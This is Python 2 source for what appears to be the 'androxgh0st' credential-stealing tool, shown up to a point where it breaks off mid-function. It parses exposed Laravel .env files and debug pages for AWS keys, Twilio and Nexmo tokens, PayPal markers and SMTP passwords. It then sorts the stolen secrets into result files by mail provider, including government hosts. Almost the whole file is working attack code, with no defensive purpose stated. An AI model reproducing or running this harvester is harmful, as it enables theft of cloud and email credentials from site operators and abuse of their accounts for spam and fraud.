#!/usr/bin/python
# -*- coding: utf-8 -*-
import requests, os, sys
from re import findall as reg
requests.packages.urllib3.disable_warnings()
from threading import *
from threading import Thread
from ConfigParser import ConfigParser
from Queue import Queue

try:
	os.mkdir('Results')
except:
	pass

list_region = '''us-east-1
us-east-2
us-west-1
us-west-2
af-south-1
ap-east-1
ap-south-1
ap-northeast-1
ap-northeast-2
ap-northeast-3
ap-southeast-1
ap-southeast-2
ca-central-1
eu-central-1
eu-east-1
eu-east-2
eu-west-1
eu-west-2
eu-west-3
eu-south-1
eu-north-1
me-south-1
sa-east-1'''
pid_restore = '.nero_swallowtail'

class Worker(Thread):
	def __init__(self, tasks):
		Thread.__init__(self)
		self.tasks = tasks
		self.daemon = True
		self.start()

	def run(self):
		while True:
			func, args, kargs = self.tasks.get()
			try: func(*args, **kargs)
			except Exception, e: print e
			self.tasks.task_done()

class ThreadPool:
	def __init__(self, num_threads):
		self.tasks = Queue(num_threads)
		for _ in range(num_threads): Worker(self.tasks)

	def add_task(self, func, *args, **kargs):
		self.tasks.put((func, args, kargs))

	def wait_completion(self):
		self.tasks.join()

class androxgh0st:
	def paypal(self, text, url):
		if "PAYPAL_" in text:
			save = open('Results/paypal_sandbox.txt','a')
			save.write(url+'\n')
			save.close()
			return True
		else:
			return False

	def get_aws_region(self, text):
		reg = False
		for region in list_region.splitlines():
			if str(region) in text:
				return region
				break

	def get_aws_data(self, text, url):
		try:
			if "AWS_ACCESS_KEY_ID" in text:
				if "AWS_ACCESS_KEY_ID=" in text:
					method = '/.env'
					try:
						aws_key = reg("\nAWS_ACCESS_KEY_ID=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\nAWS_SECRET_ACCESS_KEY=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = androxgh0st().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>AWS_ACCESS_KEY_ID</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>AWS_ACCESS_KEY_ID<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>AWS_SECRET_ACCESS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = androxgh0st().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					return False
				else:
					build = str(aws_key)+'|'+str(aws_sec)+'|'+str(aws_reg)
					remover = str(build).replace('\r', '')
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					remover = str(build).replace('\r', '')
					save2 = open('Results/aws_key.txt', 'a')
					save2.write(remover+'\n\n')
					save2.close()
				return True
			elif "AWS_KEY" in text:
				if "AWS_KEY=" in text:
					method = '/.env'
					try:
						aws_key = reg("\nAWS_KEY=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\nAWS_SECRET=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = androxgh0st().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>AWS_KEY</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>AWS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>AWS_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = androxgh0st().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					return False
				else:
					build = str(aws_key)+'|'+str(aws_sec)+'|'+str(aws_reg)
					remover = str(build).replace('\r', '')
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					remover = str(build).replace('\r', '')
					save2 = open('Results/aws_key.txt', 'a')
					save2.write(remover+'\n\n')
					save2.close()
				return True
			elif "S3_KEY" in text:
				if "S3_KEY=" in text:
					method = '/.env'
					try:
						aws_key = reg("\nS3_KEY=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\nS3_SECRET=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = androxgh0st().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>S3_KEY</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>S3_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>S3_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = androxgh0st().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					return False
				else:
					build = str(aws_key)+'|'+str(aws_sec)+'|'+str(aws_reg)
					remover = str(build).replace('\r', '')
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					remover = str(build).replace('\r', '')
					save2 = open('Results/aws_key.txt', 'a')
					save2.write(remover+'\n\n')
					save2.close()
				return True
			elif "SQS_KEY" in text:
				if "SQS_KEY=" in text:
					method = '/.env'
					try:
						aws_key = reg("\nSQS_KEY=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\nSQS_SECRET=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = androxgh0st().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
					try:
						aws_buc = reg("\nSQS_BUCKET=(.*?)\n", text)[0]
					except:
						aws_buc = ''
				elif "<td>SQS_KEY</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>SQS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>SQS_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = androxgh0st().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					return False
				else:
					build = str(aws_key)+'|'+str(aws_sec)+'|'+str(aws_reg)
					remover = str(build).replace('\r', '')
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					remover = str(build).replace('\r', '')
					save2 = open('Results/aws_key.txt', 'a')
					save2.write(remover+'\n\n')
					save2.close()
				return True
			elif "SES_KEY" in text:
				if "SES_KEY=" in text:
					method = '/.env'
					try:
					   aws_key = reg("\nSES_KEY=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\nSES_SECRET=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = androxgh0st().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>SES_KEY</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>SES_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>SES_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = androxgh0st().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					return False
				else:
					build = str(aws_key)+'|'+str(aws_sec)+'|'+str(aws_reg)
					remover = str(build).replace('\r', '')
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					remover = str(build).replace('\r', '')
					save2 = open('Results/aws_key.txt', 'a')
					save2.write(remover+'\n\n')
					save2.close()
				return True
			else:
				return False
		except:
			return False

	def get_twillio(self, text, url):
		try:
			if "TWILIO" in text:
				if "TWILIO_ACCOUNT_SID=" in text:
					method = '/.env'
					try:
						acc_sid = reg('\nTWILIO_ACCOUNT_SID=(.*?)\n', text)[0]
					except:
						acc_sid = ''
					try:
						phone = reg('\nTWILIO_NUMBER=(.*?)\n', text)[0]
					except:
						phone = ''
					try:
						auhtoken = reg('\nTWILIO_AUTH_TOKEN=(.*?)\n', text)[0]
					except:
						auhtoken = ''
				elif '<td>TWILIO_ACCOUNT_SID</td>' in text:
					method = 'debug'
					try:
						acc_sid = reg('<td>TWILIO_ACCOUNT_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						acc_sid = ''
					try:
						phone = reg('<td>TWILIO_NUMBER<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						phone = ''
					try:
						auhtoken = reg('<td>TWILIO_AUTH_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						auhtoken = ''
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nTWILIO_ACCOUNT_SID: '+str(acc_sid)+'\nTWILIO_NUMBER: '+str(phone)+'\nTWILIO_AUTH_TOKEN: '+str(auhtoken)
				remover = str(build).replace('\r', '')
				save = open('Results/TWILLIO_ACC_SID.txt', 'a')
				save.write(remover+'\n\n')
				save.close()
				return True
			elif "TWILIO_SID" in text:
				if "TWILIO_SID=" in text:
					method = '/.env'
					try:
						acc_sid = reg('\nTWILIO_SID=(.*?)\n', text)[0]
					except:
						acc_sid = ''
					try:
						auhtoken = reg('\nTWILIO_TOKEN=(.*?)\n', text)[0]
					except:
						auhtoken = ''
				elif '<td>TWILIO_SID</td>' in text:
					method = 'debug'
					try:
						acc_sid = reg('<td>TWILIO_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
				 	except:
						acc_sid = ''
					try:
						auhtoken = reg('\nTWILIO_TOKEN=(.*?)\n', text)[0]
					except:
						auhtoken = ''
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nTWILIO_ACCOUNT_SID: '+str(acc_sid)+'\nTWILIO_NUMBER: '+str(phone)+'\nTWILIO_AUTH_TOKEN: '+str(auhtoken)
				remover = str(build).replace('\r', '')
				save = open('Results/TWILLIO_SID.txt', 'a')
				save.write(remover+'\n\n')
				save.close()
				return True
			else:
				return False
		except:
			return False
			
	def get_nexmo(self, text, url):
		try:
			if "NEXMO" in text:
				if "NEXMO_KEY=" in text:
					method = '/.env'
					try:
						nex_key = reg('\nNEXMO_KEY=(.*?)\n', text)[0]
					except:
						nex_key = ''
					try:
						nex_sec = reg('\nNEXMO_SECRET=(.*?)\n', text)[0]
					except:
						nex_sec = ''
					try:
						nex_num = reg('\nNEXMO_NUMBER=(.*?)\n', text)[0]
					except:
						nex_num = ''
				elif '<td>NEXMO_KEY</td>' in text:
					method = 'debug'
					try:
						nex_key = reg('<td>NEXMO_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						nex_key = ''
					try:
						nex_sec = reg('<td>NEXMO_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						nex_sec = ''
					try:
						nex_num = reg('<td>NEXMO_NUMBER<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						nex_num = ''
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nNEXMO_KEY: '+str(nex_key)+'\nNEXMO_SECRET: '+str(nex_sec)+'\nNEXMO_NUMBER: '+str(nex_num)
				remover = str(build).replace('\r', '')
				save = open('Results/NEXMO.txt', 'a')
				save.write(remover+'\n\n')
				save.close()
				return True
			else:
				return False
		except:
			return False

	def get_smtp(self, text, url):
		try:
			if "MAIL_HOST" in text:
				if "MAIL_HOST=" in text:
					method = '/.env'
					mailhost = reg("\nMAIL_HOST=(.*?)\n", text)[0]
					mailport = reg("\nMAIL_PORT=(.*?)\n", text)[0]
					mailuser = reg("\nMAIL_USERNAME=(.*?)\n", text)[0]
					mailpass = reg("\nMAIL_PASSWORD=(.*?)\n", text)[0]
					try:
						mailaddr = reg("\nMAIL_FROM_ADDRESS=(.*?)\n", text)[0]
					except:
						mailaddr = ''
					try:
						mailadm = reg("\n@=(.*?)\n", text)[0]
					except:
						mailadm = ''
					try:
						mailfrom = reg("\nMAIL_FROM=(.*?)\n", text)[0]
					except:
						mailfrom = ''
					try:
						fromname = reg("\MAIL_FROM_NAME=(.*?)\n", text)[0]
					except:
						fromname = ''
				elif "<td>MAIL_HOST</td>" in text:
					method = 'debug'
					mailhost = reg('<td>MAIL_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					mailport = reg('<td>MAIL_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					mailuser = reg('<td>MAIL_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					mailpass = reg('<td>MAIL_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					try:
						mailaddr = reg("<td>MAIL_FROM_ADDRESS<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						mailaddr = ''
					try:
						mailadm = reg("<td>@<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						mailadm = ''
					try:
						mailfrom = reg("<td>MAIL_FROM<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						mailfrom =''
					try:
						fromname = reg("<td>MAIL_FROM_NAME<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						fromname = ''
				if mailuser == "null" or mailpass == "null" or mailuser == "" or mailpass == "":
					return False
				else:
					# mod aws
					if '.amazonaws.com' in mailhost:
						getcountry = reg('email-smtp.(.*?).amazonaws.com', mailhost)[0]
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILADDR: '+str(mailaddr)+'\nMAILFROM: '+str(mailfrom)+'\nEMAIL: '+str(mailadm)+'\nFROMNAME: '+str(fromname)
						remover = str(build).replace('\r', '')
						save = open('Results/'+getcountry[:-2]+'.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
						remover = str(build).replace('\r', '')
						save2 = open('Results/smtp_aws.txt', 'a')
						save2.write(remover+'\n\n')
						save2.close()
					elif 'sendgrid' in mailhost:
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILADDR: '+str(mailaddr)+'\nFROMNAME: '+str(fromname)
						remover = str(build).replace('\r', '')
						save = open('Results/sendgrid.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					elif 'smtp2go' in mailhost:
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILADDR: '+str(mailaddr)+'\nFROMNAME: '+str(fromname)
						remover = str(build).replace('\r', '')
						save = open('Results/smtp2go.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					elif 'sparkpostmail' in mailhost:
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILADDR: '+str(mailaddr)+'\nFROMNAME: '+str(fromname)
						remover = str(build).replace('\r', '')
						save = open('Results/sparkpostmail.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					elif 'secureserver' in mailhost:
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILADDR: '+str(mailaddr)+'\nFROMNAME: '+str(fromname)
						remover = str(build).replace('\r', '')
						save = open('Results/secureserver.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					elif 'kagoya' in mailhost:
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILADDR: '+str(mailaddr)+'\nFROMNAME: '+str(fromname)
						remover = str(build).replace('\r', '')
						save = open('Results/kagoya.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					elif 'api.createsend.com' in mailhost:
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILADDR: '+str(mailaddr)+'\nFROMNAME: '+str(fromname)
						remover = str(build).replace('\r', '')
						save = open('Results/smtp.api.createsend.com.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					elif 'bluehost' in mailhost:
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILADDR: '+str(mailaddr)+'\nFROMNAME: '+str(fromname)
						remover = str(build).replace('\r', '')
						save = open('Results/bluehost.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					elif 'securemail' in mailhost:
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILADDR: '+str(mailaddr)+'\nFROMNAME: '+str(fromname)
						remover = str(build).replace('\r', '')
						save = open('Results/securemail.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					elif 'dreamhost' in mailhost:
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILADDR: '+str(mailaddr)+'\nFROMNAME: '+str(fromname)
						remover = str(build).replace('\r', '')
						save = open('Results/dreamhost.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					elif 'awsapps' in mailhost:
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILADDR: '+str(mailaddr)+'\nFROMNAME: '+str(fromname)
						remover = str(build).replace('\r', '')
						save = open('Results/awsapps.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					elif 'postmarkapp' in mailhost:
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILADDR: '+str(mailaddr)+'\nFROMNAME: '+str(fromname)
						remover = str(build).replace('\r', '')
						save = open('Results/postmarkapp.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					elif 'elasticemail' in mailhost:
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILADDR: '+str(mailaddr)+'\nFROMNAME: '+str(fromname)
						remover = str(build).replace('\r', '')
						save = open('Results/elasticemail.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					elif 'gov' in mailhost:
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILADDR: '+str(mailaddr)+'\nFROMNAME: '+str(fromname)
						remover = str(build).replace('\r', '')
						save = open('Results/gov.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					elif 'gouv' in mailhost:
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILADDR: '+str(mailaddr)+'\nFROMNAME: '+str(fromname)
						remover = str(build).replace('\r', '')
						save = open('Results/gouv.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					elif 'turbo' in mailhost:
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILADDR: '+str(mailaddr)+'\nFROMNAME: '+str(fromname)
						remover = str(build).replace('\r', '')
						save = open('Results/turbo.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					elif 'ovh' in mailhost:
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILADDR: '+str(mailaddr)+'\nFROMNAME: '+str(fromname)
						remover = str(build).replace('\r', '')
						save = open('Results/ovh.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					elif 'pulse' in mailhost:
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILADDR: '+str(mailaddr)+'\nFROMNAME: '+str(fromname)
						remover = str(build).replace('\r', '')
						save = open('Results/pulse.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					elif 'outlook' in mailhost:
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILADDR: '+str(mailaddr)+'\nFROMNAME: '+str(fromname)
						remover = str(build).replace('\r', '')
						save = open('Results/outlook.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					elif 'hostinger' in mailhost:
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILADDR: '+str(mailaddr)+'\nFROMNAME: '+str(fromname)
						remover = str(build).replace('\r', '')
						save = open('Results/hostinger.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					elif 'production' in mailhost:
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILADDR: '+str(mailaddr)+'\nFROMNAME: '+str(fromname)
						remover = str(build).replace('\r', '')
						save = open('Results/production.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					elif 'sakura' in mailhost:
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILADDR: '+str(mailaddr)+'\nFROMNAME: '+str(fromname)
						remover = str(build).replace('\r', '')
						save = open('Results/sakura.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					elif 'xserver' in mailhost:
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILADDR: '+str(mailaddr)+'\nFROMNAME: '+str(fromname)
						remover = str(build).replace('\r', '')
						save = open('Results/xserver.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					elif 'lolipop' in mailhost:
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILADDR: '+str(mailaddr)+'\nFROMNAME: '+str(fromname)
						remover = str(build).replace('\r', '')
						save = open('Results/lolipop.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					elif 'yandex' in mailhost:
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILADDR: '+str(mailaddr)+'\nFROMNAME: '+str(fromname)
						remover = str(build).replace('\r', '')
						save = open('Results/yandex.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					elif 'emailsrvr' in mailhost:
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILADDR: '+str(mailaddr)+'\nFROMNAME: '+str(fromname)
						remover = str(build).replace('\r', '')
						save = open('Results/emailsrvr.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					elif 'exmail' in mailhost:
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILADDR: '+str(mailaddr)+'\nFROMNAME: '+str(fromname)
						remover = str(build).replace('\r', '')
						save = open('Results/exmail.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					elif 'dataweb' in mailhost:
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILADDR: '+str(mailaddr)+'\nFROMNAME: '+str(fromname)
						remover = str(build).replace('\r', '')
						save = open('Results/dataweb.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					elif 'one' in mailhost:
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILADDR: '+str(mailaddr)+'\nFROMNAME: '+str(fromname)
						remover = str(build).replace('\r', '')
						save = open('Results/one.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					elif 'worksmobile' in mailhost:
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILADDR: '+str(mailaddr)+'\nFROMNAME: '+str(fromname)
						remover = str(build).replace('\r', '')
						save = open('Results/worksmobile.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					elif 'overweb' in mailhost:
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILADDR: '+str(mailaddr)+'\nFROMNAME: '+str(fromname)
						remover = str(build).replace('\r', '')
						save = open('Results/overweb.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					elif '163' in mailhost:
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILADDR: '+str(mailaddr)+'\nFROMNAME: '+str(fromname)
						remover = str(build).replace('\r', '')
						save = open('Results/163.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					elif 'vividsoul' in mailhost:
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILADDR: '+str(mailaddr)+'\nFROMNAME: '+str(fromname)
						remover = str(build).replace('\r', '')
						save = open('Results/vividsoul.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					elif 'email-ssl' in mailhost:
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILADDR: '+str(mailaddr)+'\nFROMNAME: '+str(fromname)
						remover = str(build).replace('\r', '')
						save = open('Results/email-ssl.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					elif 'office365' in mailhost:
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILADDR: '+str(mailaddr)+'\nFROMNAME: '+str(fromname)
						remover = str(build).replace('\r', '')
						save = open('Results/office.txt', 'a')
						save.write(remover+'\n\n')
